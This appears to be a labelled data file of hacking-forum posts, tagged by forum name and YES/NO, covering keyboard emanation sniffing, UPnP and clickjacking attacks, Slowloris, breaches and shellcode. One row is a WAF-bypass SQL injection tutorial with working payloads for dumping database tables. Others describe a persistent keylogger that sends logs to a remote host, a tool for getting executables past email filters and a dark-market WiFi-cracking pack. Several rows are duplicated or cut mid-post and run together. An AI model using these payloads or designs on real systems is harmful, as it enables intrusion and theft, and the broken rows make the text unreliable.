"  That PC keyboard you\'re using may be giving away your passwords. Researchers say they\'ve discovered new ways to read what you\'re typing by aiming special wireless or laser equipment at the keyboard or by simply plugging into a nearby electrical socket.  Two separate research teams, from the Ecole Polytechnique Federale de Lausanne and security consultancy Inverse Path have taken a close look at the electromagnetic radiation that is generated every time a computer keyboard is tapped. It turns out that this keystroke radiation is actually pretty easy to capture and decode -' + '- if you\'re a computer hacker-type, that is.  The Ecole Polytechnique team did its work over the air. Using an oscilloscope and an inexpensive wireless antenna, the team was able to pick up keystrokes from virtually any keyboard, including laptops. ""We discovered four different ways to recover the keystroke of a keyboard,"" said Matin Vuagnoux, a Ph.D. student at the university. With the keyboard\'s cabling and nearby power wires acting as antennas for these electromagnetic signals, the researchers were able to read keystrokes with 95 percent accuracy over a distance of up to 20 meters (22 yards), in ideal conditions.  Laptops were the hardest to read, because the cable between the keyboard and the PC is so short, making for a tiny antenna. The researchers found a way to sniff USB keyboards, but older PS/2 keyboards, which have ground wires that connect right into the electric grid, were the best.  Read more",D4Garage4hackers,YES

"  In computer security, heap spraying is a technique used in exploits to facilitate arbitrary code execution.The term is also used to describe the part of the source code of an exploit that implements this technique. In general, code that sprays the heap attempts to put a certain sequence of bytes at a predetermined location in the memory of a target process by having it allocate (large) blocks on the process\' heap and fill the bytes in these blocks with the right values. They commonly take advantage from the fact that these heap blocks will roughly be in the same location every time the heap spray is run. Execution flow can be redirected to the heap sprays via buffer overflow or heap overflow flaws.  Heap spray was widely used by chinese hackers while attacking google and various embassies of different countries. Earlier ""vinnu"" bro had explained about heap spray. Long time ago, I got a good tutorial from the internet over heap spray. So I thought of sharing it with all people. It will give beginners a very good approach towards heap spray and its implementation. The tutorial is bit long, so no chance of posting it here. I m just gonna share the link of the blog. Its a blog of an info-sec guy. A good one So enjoy guys. Feedbacks and comments are appreciated  http://grey-corner.blogspot.com/2010...-internet.html",D4Garage4hackers,YES

"  According to a news published at H-online, IT Security specialist Daniel Garcia has released a new tool which is capable of launching attacks against home networking devices that support Universal Plug and Play (UPnP) on their interfaces. He disclosed that the entire series of routers, cable modems and other networking devices from big manufacturers are vulnerable to UPnP attacks over the Internet. The UPnP was discovered by Microsoft which allows applications to discover network gateways automatically and ask them to forward traffic on special ports back to the computers they are running on. <br> <br>Umap, the tool he made while researching, detects UPnP-enabled end devices such as DSL routers and cable modems on the internet by directly retrieving the devicesâ XML descriptions. The required URLs and ports for some models are hard-coded into the tool. This enables the software to bypass the usual restriction that only allows UPnP to search for compatible hardware via multicast in local networks. Garcia says that entire device series by Edimax, Linksys, Sitecom or Thomson ( respond to UPnP requests on their WAN interfaces as reported in the blog. He claims to have identified over 150,000 potentially vulnerable devices in a short period of time by using Umap. The scanner is also capable of sending requests containing AddPortMapping or DeletePortMapping commands to the exposed UPnP interfaces. <br> <br>Some protection measures that can be taken is to disable WAN UPnP access if possible from the routerâs administration interface, or finally replace the device with one that doesnât have this feature! <br> <br>Source",D4Garage4hackers,YES

"  ClickJacking is a little bit difficult to explain however try to imagine any button that you see in your browser from the Wire Transfer Button on your Bank, Post Blog button on your blog, Add user button on your web-site, Google Gadgets etc. ClickJacking gives the attacker to ability to invisibly float these buttons on-top of other innocent looking objects in your browser.  So when you try to click on the innocent object, you are actually clicking on the malicious button that is floating on top invisibly.  In other words, the attack is thrown by a malicious web page embedding objects, possibly from a different site, such as framed documents or plugin content (Flash, Silverlight, JavaÂ) which may lead to unwanted results if clicked by the current user (e.g. a ÂDelete all messagesÂ button in your webmail or an advertisement banner in a click fraud scheme). Using DHTML, and especially CSS, the attacker can disguise or hide the click target in several ways which go completely undetected by the user, whoÂs easily tricked into clicking it in a more or less blind way.  JavaScript increases the effectiveness of these attacks hugely, because it can make our invisible target constantly follow the mouse pointer, intercepting userÂs first click with no failure.  We can however imagine a few less effective but still feasible scriptless scenarios, e.g. covering the whole window with hidden duplicates of the target or overlaying an attractive element of the page, likely to be clicked (e.g. a game or a porn image link), with a transparent target instance.

Both the main site having xss and admin panel having sqli is on same server and same port. Otherwise the same origin policy will prevent the access to admin panel and we won\'t be able to get any data returned by sql injection. <br>2. Admin panel is package with know sqli bug and login page to this panel is well protected. <br>3. Cookies of admin panel are ""httpOnly"" which cannot be accessed by javascript. Otherwise if it\'s not, you can use classical cookie stealing with xss and compromise admin account. <br>4. SQL injection is error based. <br> <br>It works like this: <br>Attacker knows about xss in main site and sqli in admin panel. He crafts a xss payload with malicious javascript and sends it to Admin. When admin logged in into admin panel and clicks the payload, the sql injection is exploited and the returned data from the injection will be sent to attacker site which will typically has the username & password hashes for admin users. <br> <br>Thanks again for pointing me in this direction. <br> <br>AMol NAik",D4Garage4hackers,YES

"  Slowloris is a perl script written by RSnake which executes a Denial of Service Attack against Web Servers. This attack is performed at Layer 7 unlike the traditional Layer 4, DDoS attacks. There is no need for a Botnet in this case.  The script can be downloaded from here: http://ha.ckers.org/slowloris/slowloris.pl  It works, by sending partial HTTP Requests to the web server. It never sends the complete request, thereby blocking all the connections available to the Web Server.  Currently, there are a set of Web Servers which are known to be vulnerable to this type of Attack. You can find the complete list of vulnerable Web Servers on RSnake\'s site here: ha.ckers.org/slowloris/  I thought of testing it in my Lab.  Following was the setup used:  Ubuntu 11.04 running in a VM all the required perl libraries were installed on the VM.  Host OS: Windows 7 Home Premium, 64 bit. Firewall was disabled on the host.  Apache version 2.2.19 running on the Host OS.  I tried to perform a Denial of Service attack against the host OS, but for some reason it didn\'t work.  Sam Bowne has a complete set of instructions written in order to get this working, for me no success. Maybe, I will have to use a bigger html page instead of the default one which just displays the text, ""It Works!"".  You can find these instructions here: http://samsclass.info/seminars/DEFCO..._Slowloris.doc  Also, if you guys are aware of th3j3st33r who\'s busy attacking Jihadi Websites using his tool, XerXes, many hackers believe that his tool, XerXes, is a modified version of Slowloris with a frontend GUI.  In any case, first I need to get this script working in the labs. Later, we can improvise.  Regards, c0d3inj3cT",D4Garage4hackers,YES

"  It has been an embarrassing week for security firm HBGary and its HBGary Federal offshoot. HBGary Federal CEO Aaron Barr thought he had unmasked the hacker hordes of Anonymous and was preparing to name and shame those responsible for co-ordinating the group\'s actions, including the denial-of-service attacks that hit MasterCard, Visa, and other perceived enemies of WikiLeaks late last year.  When Barr told one of those he believed to be an Anonymous ringleader about his forthcoming exposÃ©, the Anonymous response was swift and humiliating. HBGary\'s servers were broken into, its e-mails pillaged and published to the world, its data destroyed, and its website defaced. As an added bonus, a second site owned and operated by Greg Hoglund, owner of HBGary, was taken offline and the user registration database published.  Over the last week, I\'ve talked to some of those who participated in the HBGary hack to learn in detail how they penetrated HBGary\'s defenses and gave the company such a stunning black eyeÂand what the HBGary example means for the rest of us mere mortals who use the Internet.

"There is a space between end of DOS stub and starting of PE header in a PE executable file. Would look garbage because it is undocumented(correct me if I am wrong) , but actually Microsoft had made it so for a specific purpose !! But the smart reverse engineers found out Lets see how .. It is a compiler specific thing. It is called Rich Signature. Strangely, it will only be generated by Microsoft's standard linkers. The dword after ""Rich"" is a key generated by the linker which repeats several times in the garbage data.When we compile a program the compiler puts the string ""@comp.id"" followed by a DWORD-sized compilerID number in our obj file. When we link our obj file the linker extracts the comp.id number and XORs it withthe key and writes it in the ""garbage"" as the 2nd DWORD before ""Rich"" Word was that Microsoft uses compiler ids to prove that a virus is made on a particular machine with a particular compiler. Proving that the person owning the computer is the virus writer !

"  VLAN hopping (virtual local area network hopping) is a computer security exploit, a method of attacking networked resources on a VLAN. The basic concept behind all VLAN hopping attacks is for an attacking host on a VLAN to gain access to traffic on other VLANs that would normally not be accessible. There are two primary methods of VLAN hopping: switch spoofing and double tagging.    Most network engineers have been told at one point or another never to use VLAN 1 for user access. The motivation behind this warning is the result of fear concerning VLAN hopping attacks, wherein an attacker can send packets with a specially-crafted 802.1Q header(s) to ""hop"" from one VLAN to another. This theory relies on the assumption that a switch will happily forward 802.1Q-tagged frames ingressing an access port.  Experimenting with VLAN hopping a gud article.

"I've been working on a Windows based Python keylogger for the past days, and I thought I would share the code here. Although it's usable in its current form, I intend to come back to it at some point, after I get more familiar with the intricacies of Windows programming, and add some features that I didn't have the knowledge (and time, and patience) to implement right away, along with improving what could be improved in its current version. Overview of what it does: When started, it hides itself in the ADS of a file and saves the log in another ADS. It checks if the current user has Administrator privileges, and if it does, it adds a registry entry for all users to run at startup, unless it's been already added. If user isn't an admin, it adds registry entry for the current user only. When it exits, it sends the log to a remote host via sockets and deletes the local log. You do not have sufficient rights to see the hidden data contained here. I tested it on Windows 7 32 bit with UAC disabled. Also, I tested the individual components for both admin and normal user, but the final version only as admin user because of the following: - I wasn't able to find a location that would be accessible by all users, regardless of privilege, so I tested it with different file ***** for admin and normal user. So, even if the keylogger was added at startup for all users, its path wouldn't exist for non-admins - I had to find a location for hiding that would ensure the script would run at startup. Initially I hid it in C: , and it would work if called directly, but when called from the startup entry, it wouldn't write the log file (although it still grabbed the keystrokes) This was the first time I wrote something specifically for Windows and it was awful. For every small step forward there were like 10 complications popping up. Some things didn't work for no apparent reason, so I had to resort to trial and error. That number of Windows restarts.. If you don't want to see the Python console, it can be saved as .pyw and ran with no console output. It can also be packaged as an exe, but it will be necessary to modify some of the source code. I can't say how portable it is between versions of Windows, especially the registry editing part might not work on 64 bit. I only tested it on one version, because there is a limit to how many virtual machines one can have, and I can't delete any of my other ones to make space for a new one. If anyone wants to play with it, it might be better to comment out the hiding and ADS parts and save the log normally to be able to check that everything works instead of fumbling for ADS's. The most efficient way I found for testing was to comment out the hiding and send log parts for the initial tests. Maybe it would have looked more organized with OOP, but when I started it, I only expected to write the keylogging part and some log sending functionality, when I got ideas for the rest I added those too and it grew a bit outside the initially expected proportions.",D1CrackingArena,YES

The sinkholing is done either to derail the botnet or disable it or take full/partial control of it. <br> <br>Some malwares use DGA (Domain Name generation algorithm) if they fail to contact any specified CnC, so they start generating domain names based on Dates and Times and try to connect to them. <br>The party that has to install a sinkhole has to guess or generate any of those Domain Names which will be contacted by the malware on that day and time prior to that day and time. <br> <br>So if the 3rd party already owns that domain and has configured a server on that domain, then all CnC requests from botnet will come to the sinkholing server. <br>And if the 3d party which own\'s the sinkhole server successfully decodes the handshake and communication of the malware with CnC, then It is possible to take full control of the botnet, and also binary updates to replace the bots can also be sent and also the party can shut down the botnet. <br> <br>...""vinnu""",D4Garage4hackers,NO

"â Base64 URI Download Link Generator is a tool that will convert any file into a downloadable html link. This is useful in certain cases, for example you want to send an html email to a user with actionable stuff! All you have to do is open the file you want to embed, Convert to Ascii, copy the code to ""Base64 URI Download Link Generator"", give it a filename and extension, a name and press ""Encode"". In a few seconds, depending on the size of the file, a html code with base64 encoding will be generated. The main reason why i code this tool was because attachments are been blocked on most email providers and you won't be able to send exe, zip, cmd, lnk, etc. This is a security method implemented by email providers to reduce virus spreading and ""Base64 URI Download Link Generator"" is the way to use if you want to send suspicious files to a user and still bypass email providers filters. Note: The program is a bit slow. Note 2: Data URI Scheme doesn't work with IE or EDGE.

"  According to a news published at H-online, IT Security specialist Daniel Garcia has released a new tool which is capable of launching attacks against home networking devices that support Universal Plug and Play (UPnP) on their interfaces. He disclosed that the entire series of routers, cable modems and other networking devices from big manufacturers are vulnerable to UPnP attacks over the Internet. The UPnP was discovered by Microsoft which allows applications to discover network gateways automatically and ask them to forward traffic on special ports back to the computers they are running on. <br> <br>Umap, the tool he made while researching, detects UPnP-enabled end devices such as DSL routers and cable modems on the internet by directly retrieving the devicesâ XML descriptions. The required URLs and ports for some models are hard-coded into the tool. This enables the software to bypass the usual restriction that only allows UPnP to search for compatible hardware via multicast in local networks. Garcia says that entire device series by Edimax, Linksys, Sitecom or Thomson ( respond to UPnP requests on their WAN interfaces as reported in the blog. He claims to have identified over 150,000 potentially vulnerable devices in a short period of time by using Umap. The scanner is also capable of sending requests containing AddPortMapping or DeletePortMapping commands to the exposed UPnP interfaces. <br> <br>Some protection measures that can be taken is to disable WAN UPnP access if possible from the routerâs administration interface, or finally replace the device with one that doesnât have this feature! <br> <br>Source",D4Garage4hackers,YES

"  Sounds bit different, but yes, hackers can blow your Apple laptop using its battery. According to security researcher Charlie Miller of Accuvant, AppleÂs Macbook batteries can be hacked to cause fires or used to plant malware. He will be demonstaring the hack at the Black Hat security conference which is going to be held next month in Las Vegas. The demonstration will be showing how to hack into and control a batteryÂs microprocessor  Charlie Miller told Forbes News that ÂThese batteries just arenÂt designed with the idea that people will mess with them. What IÂm showing is that itÂs possible to use them to do something really bad.Â If the controller for the battery has been compromised it can be manipulated to the point where the battery is dead i.e. bricked. It might be possible to cause a fire or explosion by placing malware on the chip, although Miller hasnÂt put up these idea so far. Well, the demonstration next month will be interesting to watch. This research has shown the potential of hacking in any form. It will be interesting to see whether other batteries and laptops resemble the same vulnerability.  Source",D4Garage4hackers,YES

"THE BEST PRO WIFI HACKING TOOLS PACK 2017  Here we figured out three tools of the set.<br>  <br> 1. Aircrack<br> Aircrack is one of the most popular wireless passwords cracking tools which you can use for 802.11a/b/g WEP and WPA cracking.<br> Aircrack uses the best algorithms to recover wireless passwords by capturing packets. Once enough packets have been gathered,<br> it tries to recover the password. To make the attack faster, it implements a standard FMS attack with some optimizations.<br> The company behind the tool also offers an online tutorial where you can learn how to install and use this tool to<br> crack wireless passwords. It comes as Linux distribution, Live CD and VMware image options. You can use any of these.<br> It supports most of the wireless adapters and is almost guaranteed to work. If you are using a Linux distribution,<br> the only drawback of the tool is that it requires deeper knowledge of Linux. If you are not comfortable with Linux,<br> you will find it hard to use this tool. In this case, try Live CD or VMWare image. VMWare Image needs less knowledge,<br> but it only works with a limited set of host OS, and only USB devices are supported.<br> Before you start using this too, confirm that the wireless card can inject packets. Then start WEP cracking.<br> Read the online tutorial on the website to know more about the tool. If you will follow steps properly,<br> you will end up getting success with this tool.<br>  <br> 2. AirSnort<br> AirSnort is another popular tool for decrypting WEP encryption on a wi-fi 802.11b network.<br> It is a free tool and comes with Linux and Windows platforms. This tool is no longer maintained,<br> but it is still available to download from Sourceforge. AirSnort works by passively monitoring transmissions and<br> computing encryption keys once it has enough packets received. This tool is simple to use. If you are interested,<br> you can try this tool to crack WEP passwords.<br>  <br> 3. Cain & Able<br> Cain & Able is a popular password cracking tool. This tool is developed to intercept network traffic and<br> then discover passwords by bruteforcing the password using cryptanalysis attack methods. It can also recover<br> wireless network keys by analyzing routing protocols. It you are trying to learn wireless security and password cracking,<br> you should once try this tool.<br>  <br> Aircrack-ng<br> AirJack<br> Airsnort<br> Cain & Abel<br> CommView<br> CowPatty<br> InSSIDer<br> Kismet<br> LibPcap,<br> NetStumbler<br> OpenSSL<br> TCPDump<br> WepAttack<br> WireShark<br> ZLib<br><br>We always care about the safety of our customers!!! <br>",D3DreamMarket,YES

"  ClickJacking is a little bit difficult to explain however try to imagine any button that you see in your browser from the Wire Transfer Button on your Bank, Post Blog button on your blog, Add user button on your web-site, Google Gadgets etc. ClickJacking gives the attacker to ability to invisibly float these buttons on-top of other innocent looking objects in your browser.  So when you try to click on the innocent object, you are actually clicking on the malicious button that is floating on top invisibly.  In other words, the attack is thrown by a malicious web page embedding objects, possibly from a different site, such as framed documents or plugin content (Flash, Silverlight, JavaÂ) which may lead to unwanted results if clicked by the current user (e.g. a ÂDelete all messagesÂ button in your webmail or an advertisement banner in a click fraud scheme). Using DHTML, and especially CSS, the attacker can disguise or hide the click target in several ways which go completely undetected by the user, whoÂs easily tricked into clicking it in a more or less blind way.  JavaScript increases the effectiveness of these attacks hugely, because it can make our invisible target constantly follow the mouse pointer, intercepting userÂs first click with no failure.  We can however imagine a few less effective but still feasible scriptless scenarios, e.g. covering the whole window with hidden duplicates of the target or overlaying an attractive element of the page, likely to be clicked (e.g. a game or a porn image link), with a transparent target instance.

"WAF By-Passing You may be asking, what is WAF By-Passing? First off, I'll be explaining what WAF is. WAF stands for Web Application Firewall. A Web Application Firewall is put in place, so that their website will be secure from attacks such as SQL Injection, XSS, and more exploitation methods. The WAF filters commands put through to the Database, and detects attakcs against the site. A WAF Error will look like this: Code: FORBIDDEN You are not allowed to access """" on this server *INFORMATION ABOUT THE WEBSERVER IS HERE* If we get that error when we're using Union Select, that means that there is a WAF set in the webserver. So, in-order to by-pass it, we'll have to change our Syntax of the command, so that the filter doesn't detect an attack. There are several methods on how to by-pass the WAF, I will be explaining a few: 1. You don't have to worry about getting the number of columns, the Firewalls don't block that, however, the DO block the union select command, so here is method 1, on how to By-Pass the Firewall. The code we're going to be using will be using different ""Symbols"" to by-pass the filter. It looks like this: Code: http://www.hopefullyvulnerablesite.com/event.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3-- That will by-pass the Firewall. However, we still have several steps. Because we still need the other information from the tables and columns. Once that is done, we will be getting the information from the vulnerable columns, so here's what it should look like: Code: http://www.hopefullyvulnerablesite.com/event.phpid=-1 /*!UNION*/ /*!SELECT*/ 1,CoNcAt(version()),3-- To make this tutorial a little shorter, we'll be grabbing more information with just one command. So let's try it like this: Code: http://www.hopefullyvulnerablesite.com/event.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,CoNcAt(version(),0x3a,user(),0x3a,database(),0x3 a),3-- Now, it should be displaying the information we asked for IN ORDER. So it'll be showing the Version, then the Username, then the Database name. Now we'll be getting the table names. So we will again, have to by-pass the WAF. This time, the command will look like this: Code: http://www.hopefullyvulnerablesite.com/event.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,Group_Concat(table_name),3 from /*!information_schema*/.tables where table_schema=database()-- Now, that will be displaying all the tables. Now that access the table's information, we're going to use this commdn to by-pass the firewall: Code: http://www.hopefullyvulnerablesite.com/event.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,Group_Concat(column_name),3 from /*!information_schema*/.columns where table_name=0x*HEX CODE OF THE TABLE NAME*-- There we go, now we're looking at the information of the tables. Now we want to dump the columns, so here's what we'll use: Code: http://www.hopefullyvulnerablesite.com/event.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,Group_Concat(*COLUMN NAME HERE*),3 from *DATABASE NAME HERE*.*TABLE NAME HERE* And that's all for WAF By-Passing. Hopefully now, you're an SQL Injection expert . If you need any more help, feel free to PM me, or even add a comment. I really hope this helped, good luck! Epilogue This tutorial took me a long time to write, and I really hope this will help people understand how to perform an SQL Injection. SQL Injection IS ILLEGAL. So whatever you do with it, is your responsibilty, not mine. You can get in lots of trouble for an SQL Injection. Check out the Proxies and Socks section for protection while hacking a site. Good luck! And have fun!!!!!",D2CrackingFire,NO

"  hi everyone,  so here is the thing.. my laptop\'s ram is too small to host 4 operating systems namely: backtrack 5, metasploitable, ubuntu 9.04, windows xp and with the main operating system os x.... (total to 5 OSs) so i left backtrack in my macbook and moved the lab into my windows machine.. with 2Gb ram...  i tried making the lab\'s machines on bridge mode in vmware (in my windows machine) but then i discovered that my ISP network is an NAT network.. It is like I have a local Ip (in the form 10.13.1.70 ) on each machine... and when i try pining the other machines from my backtrack, it doesn\'t ping through the internet..  So I was wondering how i can create a local network at home for my personal use.. Like what do i need? will an adhoc do?? or do i need to buy some hardware??  and how should the network be like? I tried searching on google about this but i couldn\'t get to something useful...  plus when the linux machines are on bridged mode, they never use an IPv4... they always have an IPv6 which terribly confuse me! how does it work?? how can i use it with Nessus? how can i ping it?? and how to set it in RHOST in msf???? it just gives me a headache! so is there a way to force it to use IPv4?  sorry i am not a networking dude... i would love to learn though..  I am also sorry if my thread doesnt make lots of sense.. but i guess this is why we r called beginners right? so pleaase help! and thanks in advance to anyone who attempts to help!!",D4Garage4hackers,NO

"  Well, let me clear few things here. Once we figure out that a web page can be rendered in a transparent iframe, we need to look for one-click actions (button/link) which when clicked, will perform specific action. <br> <br>Let\'s assume that we have a button. So we need to ""Design a attack site, render vulnerable page in transparent iframe and place a dummy button on top of the button from iframe. So when user sees the page, it see the dummy button and when clicked, it\'s actually clicking the button from iframe. This happens because there is no action on the dummy button. If you put any action/event on the dummy button, it\'ll get executed when clicked. Here it\'s just plane button, so when clicked, it do nothing but the same click will affect the button below it (in iframe) which has some action. <br> <br>Hope this clears the doubt. <br> <br>AMol NAik",D4Garage4hackers,YES

So here are some techniques using which presence of virtual environment is detected. As discussed and shown in the posts, an increasing number of malwares are using these techniques to make the lives of malware researchers hard. Often malware researchers use virtual environments to study malware.

"  A week back, Citigroup had confirmed of a data breach that led to the disclosures of 200,00 customerÂs information. In a latest post at Help Net Security, the attack was made possible by the exploitation of a vulnerability simple vulnerability listed in OWASPÂs top 10 web application risks list. The flaw in question is called insecure direct object reference, and it happens when confidential information is exposed to users because developers did not have the good sense to hide it. In common language, the hack was made successful using simple URL manipulation !  Using this flaw, hackers were able to impersonate actual account holders by using a simple trick. After logging into a valid account, the URL to the Citi Account Online system contains a string of numbers which represents the customerÂs account. By changing this string, the criminals were able to easily switch between multiple accounts and obtain private customer information. Using a script to automate this process allowed them to do so hundreds of thousands of times. ÂOnce the attackers realized it Â IÂm guessing one of them probably had an account with Citigroup Â it was only a matter of writing a script that would feed random numbers into the URL and every time it successfully accessed an account, the attackers harvested the information contained in itÂ quoted the post on Help Net.

When you want to add some text dynamically to any element, following two ways I know works.  Example 1: Use of document.innerHTML   Code: Dynamic Text Addition example First line of paragraph.  add another text This code is vulnerable to XSS. document.innerHTML() doesn\'t sanitize the string. Replace ""Hey Hi dude!"" with """" and Test.  Example 2: Use of document.createTextNode()   Code: createTextNode example First line of paragraph.  add another textNode. Example taken from https://developer.mozilla.org/en/DOM...createTextNode  document.createTextNode() by default encode the malicious characters responsible for XSS. Replace "" Some text added dynamically. "" with """" and Test.  It is recommended to use document.createTextNode() instead of document.innerHTML to prevent XSS.  Hope you like this. Please comment this thread if you have any queries.  Cheers, AMol NAik",D4Garage4hackers,YES

"  Well, let me clear few things here. Once we figure out that a web page can be rendered in a transparent iframe, we need to look for one-click actions (button/link) which when clicked, will perform specific action. <br> <br>Let\'s assume that we have a button. So we need to ""Design a attack site, render vulnerable page in transparent iframe and place a dummy button on top of the button from iframe. So when user sees the page, it see the dummy button and when clicked, it\'s actually clicking the button from iframe. This happens because there is no action on the dummy button. If you put any action/event on the dummy button, it\'ll get executed when clicked. Here it\'s just plane button, so when clicked, it do nothing but the same click will affect the button below it (in iframe) which has some action. <br> <br>Hope this clears the doubt. <br> <br>AMol NAik",D4Garage4hackers,YES

"  Yesterday Pakistani government officials tracked and arrested 5 members of \'PakBugs\', the famous Pakistani Hacker group. The group was involved in hacking/defacing thousands of websites belonging to government, non-government and international organizations. It is believed the founder of Pakbugs \'Jawad Ehsan\', alias \'Humza\', remains at large and is believed to be based in Riyadh Saudi Arabia. But the co-founder \'Hassan Khan\' has been detained in the northwest Pakistani city of Peshawar, along with other members in Lahore, Bannu and Rawalpindi. It is believed that the arrest has been done mainly for hacking of Press Information Department (PID) (hxxp://www.pid.gov.pk) and Google Morocco (hxxp://www.google.com.ma). The hackers are also charged for credit card jacking and usage of stolen credit cards.  The involvement of these hackers in terrorism was ruled out and the men are just charged for electronic crimes. The statements said the arrested men have expertise in techniques Â Linux, SQL Injection, Trojan horses, Phishing, Rooting, Access to various servers, Botnets, PHP Scripts, Stealers, ASP scripts (self writing), JSP scripts (self writing), Key loggers and Credit Cards Jacking and usage of stolen Credit Cards.

Hacking continues to develop, becoming ever more sophisticated, adapting and growing in ingenuity as well as in the damage that results. Web attacks running over web ports strike with enormous impact. Stuart McClure's new book focuses on Web hacking, an area where organizations are particularly vulnerable. The material covers the web commerce ""playground', describing web languages and protocols, web and database servers, and payment systems. The authors bring unparalleled insight to both well- known and lesser known web vulnerabilities.

"  Hello,  Two types of malware attacks encountered in last 2 months for my site. The first was modification of .htaccess file to add redirection to malware site mobi-avto.ru for mobile users. I cleaned the .htaccess file for about 6 times after repeated attack and now it is stopped and detected a new one. When we load the site there were hidden requests sent to mobi-avto.ru and a couple of other sites, possibly for obtaining impressions or traffic? The infected file was wp-includes/default-filters.php, the malware code was added before the penultimate line.      function Kgspy_xig(){echo\'\';} add_action(\'wp_footer\',Kgspy_xig);    Please advise, how the attacker is getting access to my filesystem and how to prevent this.  Thanks in advance",D4Garage4hackers,YES
  I am sure all of us would have atleast used this gateway once in India.CCAvenue one of India\'s leading payment gateways got hacked and passwords of merchants published online. The attackers took advantage of an SQL Injection vulnerability and added to that the passwords in the Database were in plain text format. <br> <br>The full disclosure story can be found here http://www.hackerregiment.com/ccaven...ed-online.html,D4Garage4hackers,YES

"  Hi,  Yes, Securitytube\'s Python videos require you to sign up for paid course. You can try searching ""Google Python Class"". Those videos are very good. Start with those then there are many other options on internet. As for blog post, there are many things you can post. Let me give you an example,  Say you\'re learning python. You come across a pretty good library named BeautifulSoup. You learn about it and come up with an good program. Now you can post that on your blog so others can learn from it and potential employers can see that you know how to code. Another example, say you\'re learning assembly and reversing. While reversing some code, you notice some different obfuscation method used by someone, post it. You cant find answer to a question, you can post it on forum. And many other things.  I dont write regular blog but check some of the blogs by Garage members,  1. Rahul Sasi a.k.a FB1H2S - Garage4hackers Forum - Fb1h2s aka Rahul Sasi\'s Blog - Blogs 2.

"  A new zero-day exploit in Microsoft Windows was disclosed today. The exploit allows an application to elevate privilege to ""system,"" and in Vista and Windows 7 also bypass User Account Control (UAC). <br>The exploit takes advantage of a bug in win32k.sys, which is part of the Windows kernel. The flaw is related to the way in which a certain registry key is interpreted and enables an attacker to impersonate the system account, which has nearly unlimited access to all components of the Windows system.

The flaw appears to affect all versions of Windows back to at least Windows XP, including the latest Windows 2008 R2 and Windows 7 systems.

"  Hello guys,  recently I was working on some poc code when I came across this interesting feature. So I wanted to share with you.  When you want to add some text dynamically to any element, following two ways I know works.  Example 1: Use of document.innerHTML   Code: Dynamic Text Addition example First line of paragraph.  add another text This code is vulnerable to XSS. document.innerHTML() doesn\'t sanitize the string. Replace ""Hey Hi dude!"" with """" and Test.  Example 2: Use of document.createTextNode()   Code: createTextNode example First line of paragraph.  add another textNode. Example taken from https://developer.mozilla.org/en/DOM...createTextNode  document.createTextNode() by default encode the malicious characters responsible for XSS. Replace "" Some text added dynamically. "" with """" and Test.  It is recommended to use document.createTextNode() instead of document.innerHTML to prevent XSS.  Hope you like this. Please comment this thread if you have any queries.  Cheers, AMol NAik",D4Garage4hackers,YES

"In Brief Viber, the popular mobile messaging app announced Tuesday that it has added full end-to-end encryption for video, voice and text message services for its millions of users.Here, the end-to-end encryption means only you and the person you are communicating with can read the content, and nobody in between, not even the company and if court orders company to provide user data, they will get only the heaps of encrypted data. Viber is the latest messaging platform to join WhatsApp, Telegram, and Apple iMessage, who strengthened their default privacy features in recent times. Founded in 2010 and acquired by Japanese e-commerce titan Rakuten for $900 Million in 2014, Viber is currently being used by more than 700 Million users globally across Android, iOS, Windows Phone, and desktop, the company claimed in a blog post published today.The move comes just a couple of weeks after Facebook-owned Whatsapp messaging app implemented full end-to-end encryption by default for its one billion users. Also Read:*Cryptocat offers end-to-end encryption For Facebook Messenger. Besides offering end-to-end encryption on all communication, the company will also provide a new PIN-protected hidden chat feature to help its users hide conversations from the main chat list, as well as Contact Authentication feature to verify contacts you're talking to. All users need to update their app with the latest version of the company's software, Viber 6.0, take advantage of the features. Once installed, your Viber app will now show you a padlock in conversations to confirm that your one-to-one and group messages are end-to-end encrypted. Recommended Read: The Best Way to Send and Receive End-to-End Encrypted Emails. However, users will probably need to wait few weeks before everyone's app updates to add the new end-to-end encryption on Android and iOS. In the wake of Appleâs months-long battle with the Federal Bureau of Investigation (FBI) over an iPhone used by a San Bernardino terrorist, it seems like end-to-end encryption has become a trend and youâll continue to see this in more applications and services.",D2CrackingFire,NO

"d4rkpr1nc3, Shellcode is nothing but set of machine instructions which you normally write so that when you gain control over vulnerable program that program will redirect EIP to the shellcode(basically instructions written by author to do something) and then those instructions will get executed instead of actual program code. for eg. lets say your computer is having Winamp installed which is vulnerable. now did you seen any option in winamp to launce calc.exe?? NO but as the winamp is vulnerable, so what you can do is create exploit in which you will insert shellcode which is nothing but instructions to execute calc.exe so when you use this exploit what it will do is copy your shellcode somewhere in memory then control your program(winamp) and ask it to jump on a memory location where your shellcode is placed so once it take jump to your shellcode it get executed and you see calc.exe running on your computer. hope this cleared your doubt if not then feel free to ask your doubt again.",D4Garage4hackers,YES
